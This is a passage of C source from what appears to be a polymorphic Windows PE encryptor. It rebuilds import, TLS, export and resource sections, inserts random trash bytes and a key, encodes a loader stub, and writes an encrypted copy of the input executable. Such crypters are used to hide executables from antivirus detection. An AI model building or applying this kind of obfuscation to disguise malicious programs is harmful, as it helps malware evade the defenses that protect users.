                                                                        NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size=ImportSection.SizeOfRawData;
                                                                        ImportSection.Characteristics=IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ;
                                                                        
                                                                        CurVirtAddr=ImportSection.VirtualAddress+ImportSection.Misc.VirtualSize;
                                                                        CurRawData=ImportSection.PointerToRawData+ImportSection.SizeOfRawData;
                                                                        
                                                                        if(!Quiet)
                                                                        {
                                                                                printf("\n.idata section virtual address: 0x%x",ImportSection.VirtualAddress);
                                                                                printf("\n.idata section virtual size: 0x%x",ImportSection.Misc.VirtualSize);
                                                                        }
                                                                        
                                                                        // .tls Section
                                                                        if(TlsSectionPresent)
                                                                        {
                                                                                if(!Quiet)
                                                                                {
                                                                                        printf("\n");
                                                                                        printf("\nBuilding .tls section");
                                                                                }
                                                                                TlsCopy.Directory=&pimage_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
                                                                                TlsCopy.SectionData=(PIMAGE_TLS_DIRECTORY__)
                                                                                        RVA2RAW(MainData,TlsCopy.Directory->VirtualAddress);
                                                                                if(TlsCopy.SectionData!=NULL)
                                                                                {
                                                                                        TlsCopy.RawDataLen=TlsCopy.SectionData->EndAddressOfRawData-TlsCopy.SectionData->StartAddressOfRawData;
                                                                                        TlsCopy.RawData=(DWORD)MyAlloc(TlsCopy.RawDataLen);

                                                                                        PB=RVA2RAW(MainData,TlsCopy.SectionData->StartAddressOfRawData-HostImageBase);
                                                                                        ch_temp=(PCHAR)TlsCopy.RawData;
                                                                                        if(PB!=NULL) CopyMemory(ch_temp,PB,TlsCopy.RawDataLen);
                                                                                        else ZeroMemory(ch_temp,TlsCopy.RawDataLen);

                                                                                        PB=(PCHAR)RVA2RAW(MainData,TlsCopy.SectionData->AddressOfCallBacks-HostImageBase);
                                                                                        if(PB==NULL)
                                                                                        {
                                                                                                TlsCopy.CallbacksLen=4;
                                                                                                TlsCopy.Callbacks=(PCHAR)MyAlloc(TlsCopy.CallbacksLen);
                                                                                                ZeroMemory(TlsCopy.Callbacks,TlsCopy.CallbacksLen);
                                                                                        }
                                                                                        else
                                                                                        {
                                                                                                TlsCopy.CallbacksLen=GetTlsCallbacksLen((PDWORD)PB);
                                                                                                TlsCopy.Callbacks=(PCHAR)MyAlloc(TlsCopy.CallbacksLen);
                                                                                                CopyMemory(TlsCopy.Callbacks,PB,TlsCopy.CallbacksLen);
                                                                                        }

                                                                                        ZeroMemory(&TlsSection,sizeof(TlsSection));
                                                                                        CopyMemory(&TlsSection.Name,".tls",4);
                                                                                        TlsSection.VirtualAddress=CurVirtAddr;
                                                                                        TlsSection.PointerToRawData=CurRawData;
                                                                                        TlsSection.Characteristics=IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ;
                                                                                
                                                                                        ZeroMemory(&TlsSectionData,sizeof(TlsSectionData));
                                                                                        TlsSectionData.StartAddressOfRawData=NtHeaders.OptionalHeader.ImageBase+TlsSection.VirtualAddress+RoundSize(sizeof(TlsSectionData),0x10);
                                                                                        TlsSectionData.EndAddressOfRawData=TlsSectionData.StartAddressOfRawData+TlsCopy.RawDataLen;
                                                                                        TlsSectionData.AddressOfCallBacks=RoundSize(TlsSectionData.EndAddressOfRawData,0x10);
                                                                                        TlsSectionData.AddressOfIndex=RoundSize(TlsSectionData.AddressOfCallBacks+TlsCopy.CallbacksLen,0x08);
                                                                                
                                                                                        TlsSection.SizeOfRawData=RoundSize(TlsSectionData.AddressOfIndex-TlsSection.VirtualAddress-NtHeaders.OptionalHeader.ImageBase+0x10,RawDataAlignment);
                                                                                        TlsSection.Misc.VirtualSize=RoundSize(TlsSection.SizeOfRawData,NtHeaders.OptionalHeader.SectionAlignment);
                                                                                
                                                                                        NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress=CurVirtAddr;       //may change
                                                                                        NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size=TlsSection.SizeOfRawData;
                                                                                
                                                                                        CurVirtAddr=TlsSection.VirtualAddress+TlsSection.Misc.VirtualSize;
                                                                                        CurRawData=TlsSection.PointerToRawData+TlsSection.SizeOfRawData;
                                                                                }
                                                                                else 
                                                                                {
                                                                                        TlsSectionPresent=FALSE;
                                                                                }
                                                                                if(!Quiet)
                                                                                {
                                                                                        printf("\n.tls section virtual address: 0x%x",TlsSection.VirtualAddress);
                                                                                        printf("\n.tls section virtual size: 0x%x",TlsSection.Misc.VirtualSize);
                                                                                        if(!TlsSectionPresent)
                                                                                        {
                                                                                                printf("\n..tls section is invalid, new executable may not work");
                                                                                        }
                                                                                }
                                                                        }
                        
                                                                        if(ExportSectionPresent)
                                                                        {
                                                                                if(!Quiet)
                                                                                {
                                                                                        printf("\n");
                                                                                        printf("\nBuilding .edata section");
                                                                                }
                                                                                ZeroMemory(&ExportSection,sizeof(ExportSection));
                                                                                CopyMemory(&ExportSection.Name,".edata",6);
                                                                        
                                                                                ExportSection.VirtualAddress=CurVirtAddr;
                                                                                ExportSection.PointerToRawData=CurRawData;
                                                                                ExportSection.Characteristics=IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ;
                                                                                ExportSection.SizeOfRawData=RoundSize(ExportSectionSize,RawDataAlignment);
                                                                                ExportSection.Misc.VirtualSize=RoundSize(ExportSection.SizeOfRawData,NtHeaders.OptionalHeader.SectionAlignment);
                                                                        
                                                                                NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress=CurVirtAddr;       //may change
                                                                                NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size=ExportSection.SizeOfRawData;
                                                                        
                                                                                CurVirtAddr=ExportSection.VirtualAddress+ExportSection.Misc.VirtualSize;
                                                                                CurRawData=ExportSection.PointerToRawData+ExportSection.SizeOfRawData;
                                                                        
                                                                                ExportData=(PCHAR)MyAlloc(ExportSection.Misc.VirtualSize);
                                                                                ZeroMemory(ExportData,ExportSection.Misc.VirtualSize);
                                                                        
                                                                                PB=(PCHAR)VirtAddrToPhysAddr(MainData,pimage_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                                                                                if(PB!=NULL)
                                                                                {
                                                                                        PB+=DWORD(MainData);
                                                                                }
                                                                                CopyMemory(ExportData,PB,ExportSectionSize);
                                                                        
                                                                                pimage_export_directory=(PIMAGE_EXPORT_DIRECTORY)ExportData;
                                                                                //now fix RVAs in export section in Export Directory Table
                                                                                ExportNamePointerRVAOrg=pimage_export_directory->AddressOfNames;
                                                                                ExportAddressRVAOrg=pimage_export_directory->AddressOfFunctions;
                                                                                ExportRVADelta=ExportSection.VirtualAddress-HostExportSectionVirtualAddress;
                                                                                pimage_export_directory->Name=pimage_export_directory->Name+ExportRVADelta;
                                                                                pimage_export_directory->AddressOfFunctions=pimage_export_directory->AddressOfFunctions+ExportRVADelta;
                                                                                pimage_export_directory->AddressOfNames=pimage_export_directory->AddressOfNames+ExportRVADelta;
                                                                                pimage_export_directory->AddressOfNameOrdinals=pimage_export_directory->AddressOfNameOrdinals+ExportRVADelta;

                                                                                //+ fix RVAs in Export Name Pointer Table
                                                                                PB2=(PCHAR)VirtAddrToPhysAddr(MainData,ExportNamePointerRVAOrg);
                                                                                PB2-=DWORD(DWORD(PB)-DWORD(MainData));
                                                                                PB2+=DWORD(ExportData);
                                                                                for(i=0;i<(int)pimage_export_directory->NumberOfNames;i++)
                                                                                {
                                                                                        memcpy(PB2,PB2+ExportRVADelta,4);
                                                                                        PB2+=sizeof(DWORD);
                                                                                }

                                                                                if(!Quiet)
                                                                                {
                                                                                        printf("\nexport section virtual address: 0x%x",ExportSection.VirtualAddress);
                                                                                        printf("\nexport section virtual size: 0x%x",ExportSection.Misc.VirtualSize);
                                                                                }
                                                                        }
                                                                        
                                                                        if(ResourceSectionPresent)
                                                                        {
                                                                                if(!Quiet)
                                                                                {
                                                                                        printf("\n");
                                                                                        printf("\nBuilding .rsrc section");
                                                                                }

                                                                                ZeroMemory(&ResourceSection,sizeof(ResourceSection));
                                                                                CopyMemory(&ResourceSection.Name,".rsrc",5);
                                                                        
                                                                                ResourceSection.VirtualAddress=CurVirtAddr;
                                                                                PrepareResourceSectionData();
                                                                                ResourceSection.PointerToRawData=CurRawData;
                                                                                ResourceSection.Characteristics=IMAGE_SCN_MEM_READ;
                                                                                ResourceSection.SizeOfRawData=RoundSize(ResourceSectionSize,RawDataAlignment);
                                                                                ResourceSection.Misc.VirtualSize=RoundSize(ResourceSection.SizeOfRawData,NtHeaders.OptionalHeader.SectionAlignment);
                                                                        
                                                                                NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress=CurVirtAddr;
                                                                                NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size=ResourceSection.SizeOfRawData;
                                                                        
                                                                                CurVirtAddr=ResourceSection.VirtualAddress+ResourceSection.Misc.VirtualSize;
                                                                                CurRawData=ResourceSection.PointerToRawData+ResourceSection.SizeOfRawData;

                                                                                if(!Quiet)
                                                                                {
                                                                                        printf("\nresource section virtual address: 0x%x",ResourceSection.VirtualAddress);
                                                                                        printf("\nresource section virtual size: 0x%x",ResourceSection.Misc.VirtualSize);
                                                                                }
                                                                        }

                                                                        NtHeaders.OptionalHeader.SizeOfImage=CurVirtAddr;

                                                                        if(!Quiet)
                                                                        {
                                                                                printf("\n");
                                                                                printf("\nBuilding import descriptor ...");
                                                                        }
                                                                        ZeroMemory(&ImportDesc,sizeof(ImportDesc));
                                                                        ImportDesc.Characteristics=ImportSection.VirtualAddress+(NumberOfDLL+1)*sizeof(ImportDesc);
                                                                        ImportDesc.Name=ImportSection.VirtualAddress+(NumberOfDLL+1)*sizeof(ImportDesc)+(NumberOfImports+1)*sizeof(IMAGE_THUNK_DATA)*2;
                                                                        ImportDesc.FirstThunk=ImportDesc.Characteristics+(NumberOfImports+1)*sizeof(IMAGE_THUNK_DATA);
                                                                        ThunkGetProcAddress.u1.Ordinal=ImportSection.VirtualAddress+(NumberOfDLL+1)*sizeof(ImportDesc)+(NumberOfImports+1)*sizeof(IMAGE_THUNK_DATA)*2+Kernel32Size+2;
                                                                        ThunkLoadLibrary.u1.Ordinal=ThunkGetProcAddress.u1.Ordinal+GetProcAddressSize+2+2;

                                                                        ZeroMemory(&NullDesc,sizeof(NullDesc));
                                                                        TotalFileSize=RoundSize(CurRawData,NtHeaders.OptionalHeader.FileAlignment);
                                                                        if(OverlayPresent) TotalFileSize+=AfterImageOverlaysSize;

                                                                        if(!Quiet)
                                                                        {
                                                                                printf("\n");
                                                                                printf("\nBuilding polymorphic part ...");
                                                                        }
                                                                        TrashSize=(WORD)KeyPtr;
                                                                        if(!Quiet)
                                                                        {
                                                                                printf("\nKey address: 0x%x",KeyPtr);
                                                                                printf("\nLoader address: 0x%x",LoaderPtr);
                                                                                printf("\nTrash bytes size: %d",TrashSize);
                                                                                printf("\nTrash2 bytes size: %d",Trash2Size);
                                                                        }

                                                                        Trash=(PCHAR)MyAlloc(TrashSize);
                                                                        Trash2=(PCHAR)MyAlloc(Trash2Size);
                                                                                
                                                                        if((Trash!=NULL)&&(Trash2!=NULL))
                                                                        {
                                                                                GenerateRandomBuffer((PBYTE)Trash,TrashSize);
                                                                                GenerateRandomBuffer((PBYTE)Trash2,Trash2Size);
                                                                        
                                                                                NtHeaders.OptionalHeader.AddressOfEntryPoint=CodeSection.VirtualAddress+LoaderPtr+LoaderSize+Trash2Size;
                                                                                if(!Quiet) printf("\nExecutable entry point: %d",NtHeaders.OptionalHeader.AddressOfEntryPoint);
                                                                                InitData=(PCHAR)MyAlloc(InitSize);
                                                                                if(InitData!=NULL)
                                                                                {
                                                                                        VirtLoaderData=NtHeaders.OptionalHeader.ImageBase+CodeSection.VirtualAddress+LoaderPtr;
                                                                                        VirtMainData=NtHeaders.OptionalHeader.ImageBase+CodeSection.VirtualAddress+LoaderPtr+LoaderSize+Trash2Size+InitSize;
                                                                                        VirtKey=NtHeaders.OptionalHeader.ImageBase+CodeSection.VirtualAddress+KeyPtr;
                                                                                
                                                                                        //initiate DynLoader image info
                                                                                        PB=LoaderData+LoaderSize;
                                                                                        memcpy(&dw_temp,PB,4);
                                                                                        while(dw_temp!=DYN_LOADER_END_MAGIC)
                                                                                        {
                                                                                                PB--;               //DYN_LOADER_END_MAGIC search
                                                                                                memcpy(&dw_temp,PB,4);
                                                                                        }
                                                                                        PB-=5;
                                                                                        memcpy(PB,&MainRealSize,4);
                                                                                        PB-=7;
                                                                                        memcpy(PB,&NtHeaders.OptionalHeader.AddressOfEntryPoint,4);
                                                                                        PB-=7;
                                                                                        memcpy(PB,&NtHeaders.OptionalHeader.SizeOfImage,4);
                                                                                        PB-=7;
                                                                                        switch(ImageType)
                                                                                        {
                                                                                        case itExe:
                                                                                                dw_temp=IMAGE_TYPE_EXE;
                                                                                                memcpy(PB,&dw_temp,4);
                                                                                                break;

                                                                                        case itDLL:
                                                                                                dw_temp=IMAGE_TYPE_DLL;
                                                                                                memcpy(PB,&dw_temp,4);
                                                                                                break;

                                                                                        case itSys:
                                                                                                dw_temp=IMAGE_TYPE_SYS;
                                                                                                memcpy(PB,&dw_temp,4);
                                                                                                break;

                                                                                        default:
                                                                                                dw_temp=IMAGE_TYPE_UNKNOWN;
                                                                                                memcpy(PB,&dw_temp,4);
                                                                                                break;
                                                                                        }
                                                                                                                                                                
                                                                                        //now fix pointers in DynLoader
                                                                                        //there are 3 push instructions
                                                                                        LdrPtrCode=NtHeaders.OptionalHeader.ImageBase+CodeSection.VirtualAddress;
                                                                                        LdrPtrThunk=NtHeaders.OptionalHeader.ImageBase+InitcodeThunk;
                                                                                
                                                                                        LdrPtr=LoaderData;
                                                                                        LdrPtr++;
                                                                                        dw_temp=LdrPtrThunk+4-LdrPtrCode;
                                                                                        memcpy(LdrPtr,&dw_temp,4);
                                                                                        LdrPtr+=5;
                                                                                        dw_temp=LdrPtrThunk-LdrPtrCode;
                                                                                        memcpy(LdrPtr,&dw_temp,4);
                                                                                        LdrPtr+=5;
                                                                                        dw_temp=VirtMainData-LdrPtrCode;
                                                                                        memcpy(LdrPtr,&dw_temp,4);
                                                                                
                                                                                        DynCoder(LoaderData,LoaderSize,Key);

                                                                                        if(!Quiet)
                                                                                        {
                                                                                                printf("\nGenerating init code ...");
                                                                                        }

                                                                                        //GenerateInitCode(ACodePtr,AKeyPtr,AData1Ptr,ASize1,AData2Ptr,ASize2,ADynLoadAddr,AMainPtr,
                                                                                        //                 AEntryPointAddr,AImpThunk:Cardinal);

                                                                                        GenerateInitCode(LdrPtrCode,KeyPtr,LoaderPtr,LoaderSize,LoaderPtr+LoaderSize+Trash2Size+InitSize,
                                                                                                                                MainRealSize,NtHeaders.OptionalHeader.ImageBase+CodeSection.VirtualAddress+LoaderPtr,
                                                                                                                                VirtMainData,NtHeaders.OptionalHeader.ImageBase+NtHeaders.OptionalHeader.AddressOfEntryPoint,
                                                                                                                                LdrPtrThunk);
                                                                                
                                                                                        if(!Quiet)
                                                                                        {
                                                                                                printf("\n");
                                                                                                printf("\nBuilding OutputFile ...");
                                                                                        }
                                                                                        FileHandle=CreateFile(OutputFileName,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
                                                                                        if(FileHandle!=INVALID_HANDLE_VALUE)
                                                                                        {
                                                                                                SetFilePointer(FileHandle,TotalFileSize,NULL,FILE_BEGIN);
                                                                                                SetEndOfFile(FileHandle);
                                                                                                if(!Quiet)
                                                                                                {
                                                                                                        printf("\nOutputFile: %s (%d)",OutputFileName,TotalFileSize);
                                                                                                        printf("\nSize of new stuff: %d bytes",TotalFileSize-MainRealSize);
                                                                                                        printf("\n");
                                                                                                        printf("\nWriting data ...");
                                                                                                        LogCnt=0;
                                                                                                        printf("\n0x%x: DOS header",LogCnt);
                                                                                                        LogCnt+=sizeof(DosHeader);
                                                                                                        printf("\n0x%x: DOS stub",LogCnt);
                                                                                                        LogCnt+=sizeof(DosStub);
                                                                                                        printf("\n0x%x: DOS stub end",LogCnt);
                                                                                                        LogCnt+=sizeof(DosStubEnd);
                                                                                                        printf("\n0x%x: NT headers",LogCnt);
                                                                                                        LogCnt+=sizeof(NtHeaders);
                                                                                                        printf("\n0x%x: Code section header",LogCnt);
                                                                                                        LogCnt+=sizeof(CodeSection);
                                                                                                        printf("\n0x%x: Import section header",LogCnt);
                                                                                                        LogCnt+=sizeof(ImportSection);
                                                                                                        if(ExportSectionPresent)
                                                                                                        {
                                                                                                                printf("\n0x%x: Export section header",LogCnt);
                                                                                                                LogCnt+=sizeof(ExportSection);
                                                                                                        }
                                                                                                        if(TlsSectionPresent)
                                                                                                        {
                                                                                                                printf("\n0x%x: TLS section header",LogCnt);
                                                                                                        }

                                                                                                        LogCnt=CodeSection.PointerToRawData;
                                                                                                        printf("\n0x%x: .text:Trash",LogCnt);
                                                                                                        LogCnt+=TrashSize;
                                                                                                        printf("\n0x%x: .text:Key",LogCnt);
                                                                                                        LogCnt+=KeySize;
                                                                                                        printf("\n0x%x: .text:DynLoader",LogCnt);
                                                                                                        LogCnt+=LoaderSize;
                                                                                                        printf("\n0x%x: .text:Trash2",LogCnt);
                                                                                                        LogCnt+=Trash2Size;
                                                                                                        printf("\n0x%x: .text:Init code",LogCnt);
                                                                                                        LogCnt+=InitSize;
                                                                                                        
                                                                                                        printf("\n0x%x: .text:Host file",LogCnt);

                                                                                                        LogCnt=ImportSection.PointerToRawData;
                                                                                                        printf("\n0x%x: .idata",LogCnt);
                                                                                                        if(TlsSectionPresent)
                                                                                                        {
                                                                                                                LogCnt=TlsSection.PointerToRawData;
                                                                                                                printf("\n0x%x: .tls",LogCnt);
                                                                                                        }
                                                                                                        if(ExportSectionPresent)
                                                                                                        {
                                                                                                                LogCnt=ExportSection.PointerToRawData;
                                                                                                                printf("\n0x%x: .edata",LogCnt);
                                                                                                        }
                                                                                                        if(ResourceSectionPresent)
                                                                                                        {
                                                                                                                LogCnt=ResourceSection.PointerToRawData;
                                                                                                                printf("\n0x%x: .rsrc",LogCnt);
                                                                                                        }

                                                                                                        if(OverlayPresent)
                                                                                                        {
                                                                                                                LogCnt=TotalFileSize-AfterImageOverlaysSize;
                                                                                                                printf("\n0x%x: overlay data",LogCnt);
                                                                                                        }
                                                                                                }

                                                                                                // stub
                                                                                                SetFilePointer(FileHandle,0,NULL,FILE_BEGIN);
                                                                                                WriteFile(FileHandle,&DosHeader,sizeof(DosHeader),&NumBytes,NULL);
                                                                                                WriteFile(FileHandle,&DosStub,sizeof(DosStub),&NumBytes,NULL);
                                                                                                WriteFile(FileHandle,&DosStubEnd,sizeof(DosStubEnd),&NumBytes,NULL);
                                                                                                WriteFile(FileHandle,&NtHeaders,sizeof(NtHeaders),&NumBytes,NULL);
                                                                                                WriteFile(FileHandle,&CodeSection,sizeof(CodeSection),&NumBytes,NULL);
                                                                                                WriteFile(FileHandle,&ImportSection,sizeof(ImportSection),&NumBytes,NULL);
                                                                                                if(TlsSectionPresent)
                                                                                                {
                                                                                                        WriteFile(FileHandle,&TlsSection,sizeof(TlsSection),&NumBytes,NULL);
                                                                                                }
                                                                                                if(ExportSectionPresent)
                                                                                                {
                                                                                                        WriteFile(FileHandle,&ExportSection,sizeof(ExportSection),&NumBytes,NULL);
                                                                                                }
                                                                                                if(ResourceSectionPresent)
                                                                                                {
                                                                                                        WriteFile(FileHandle,&ResourceSection,sizeof(ResourceSection),&NumBytes,NULL);
                                                                                                }

                                                                                                SetFilePointer(FileHandle,ImportSection.PointerToRawData,NULL,FILE_BEGIN);
                                                                                                WriteFile(FileHandle,ImportSectionData,ImportSection.SizeOfRawData,&NumBytes,NULL);

                                                                                                // Code section
                                                                                                SetFilePointer(FileHandle,CodeSection.PointerToRawData,NULL,FILE_BEGIN);

                                                                                                // Jmps to import section were moved to the end of the initcode
                                                                                                WriteFile(FileHandle,Trash,TrashSize,&NumBytes,NULL);
                                                                                                WriteFile(FileHandle,Key,KeySize,&NumBytes,NULL);
                                                                                                WriteFile(FileHandle,LoaderData,LoaderSize,&NumBytes,NULL);
                                                                                                WriteFile(FileHandle,Trash2,Trash2Size,&NumBytes,NULL);
                                                                                                WriteFile(FileHandle,InitData,InitSize,&NumBytes,NULL);

                                                                                                // Data section
                                                                                                WriteFile(FileHandle,MainDataCyp,MainSize,&NumBytes,NULL);

                                                                                                // Tls section
                                                                                                if(TlsSectionPresent)
                                                                                                {
                                                                                                        SetFilePointer(FileHandle,TlsSection.PointerToRawData,NULL,FILE_BEGIN);
                                                                                                        WriteFile(FileHandle,&TlsSectionData,sizeof(TlsSectionData),&NumBytes,NULL);

                                                                                                        Delta=TlsSectionData.StartAddressOfRawData-TlsSection.VirtualAddress-NtHeaders.OptionalHeader.ImageBase;
                                                                                                        SetFilePointer(FileHandle,TlsSection.PointerToRawData+Delta,NULL,FILE_BEGIN);
                                                                                                        ch_temp=(PCHAR)TlsCopy.RawData;
                                                                                                        WriteFile(FileHandle,ch_temp,TlsCopy.RawDataLen,&NumBytes,NULL);

                                                                                                        Delta=TlsSectionData.AddressOfCallBacks-TlsSection.VirtualAddress-NtHeaders.OptionalHeader.ImageBase;
                                                                                                        SetFilePointer(FileHandle,TlsSection.PointerToRawData+Delta,NULL,FILE_BEGIN);
                                                                                                        WriteFile(FileHandle,TlsCopy.Callbacks,TlsCopy.CallbacksLen,&NumBytes,NULL);
                                                                                                }

                                                                                                // Export section
                                                                                                if(ExportSectionPresent)
                                                                                                {
                                                                                                        SetFilePointer(FileHandle,ExportSection.PointerToRawData,NULL,FILE_BEGIN);
                                                                                                        WriteFile(FileHandle,ExportData,ExportSection.SizeOfRawData,&NumBytes,NULL);
                                                                                                        if(ExportData!=NULL)
                                                                                                        {
                                                                                                                MyFree(ExportData);
                                                                                                        }
                                                                                                }

                                                                                                // Resource section
                                                                                                if(ResourceSectionPresent)
                                                                                                {
                                                                                                        SetFilePointer(FileHandle,ResourceSection.PointerToRawData,NULL,FILE_BEGIN);
                                                                                                        WriteFile(FileHandle,ResourceData,ResourceSection.SizeOfRawData,&NumBytes,NULL);
                                                                                                        if(ResourceData!=NULL)
                                                                                                        {
                                                                                                                MyFree(ResourceData);
                                                                                                        }
                                                                                                }

                                                                                                // Overlay data
                                                                                                if(OverlayPresent)
                                                                                                {
                                                                                                        SetFilePointer(FileHandle,TotalFileSize-AfterImageOverlaysSize,NULL,FILE_BEGIN);
                                                                                                        WriteFile(FileHandle,AfterImageOverlays,AfterImageOverlaysSize,&NumBytes,NULL);
                                                                                                }

                                                                                                if(!Quiet) printf("\nWork completed!");
                                                                                                CloseHandle(FileHandle);
                                                                                        }
                                                                                        else ErrorMsg("Unable to create OutputFile.");
                                                                                        MyFree(InitData);
                                                                                }
                                                                                else ErrorMsg("Unable to allocate memory init data.");
                                                                                MyFree(Trash);
                                                                                MyFree(Trash2);
                                                                        }
                                                                        else ErrorMsg("Unable to allocate memory for trash bytes.");
                                                                        
                                                                        if(TlsSectionPresent)
                                                                        {
                                                                                MyFree((LPVOID)TlsCopy.RawData);
                                                                                MyFree((LPVOID)TlsCopy.Callbacks);
                                                                        }
                                                                        MyFree(Key);

                                                                        if(ImportSectionData!=NULL)
                                                                        {
                                                                                MyFree(ImportSectionData);
                                                                        }
                                                                }
                                                                else ErrorMsg("Unable to allocate memory for encryption key.");
                                                                MyFree(LoaderData);
                                                        }
                                                        else ErrorMsg("Unable to allocate memory for loader.");
                                                }
                                                else ErrorMsg("Unable to generate encoder/decoder"); 
                                        }
                                        else ErrorMsg("Unsupported Subsystem.");
                                }
                                else ErrorMsg("InputFile is not valid PE file.");
                        }
                        else ErrorMsg("Unable to read file.");
                        MyFree(MainData);
                }
                else ErrorMsg("Unable to allocate memory for InputFile data.");

                if(MainFile!=INVALID_HANDLE_VALUE) CloseHandle(MainFile);
        }
        else ErrorMsg("Unable to open file.");
        return 0;
}

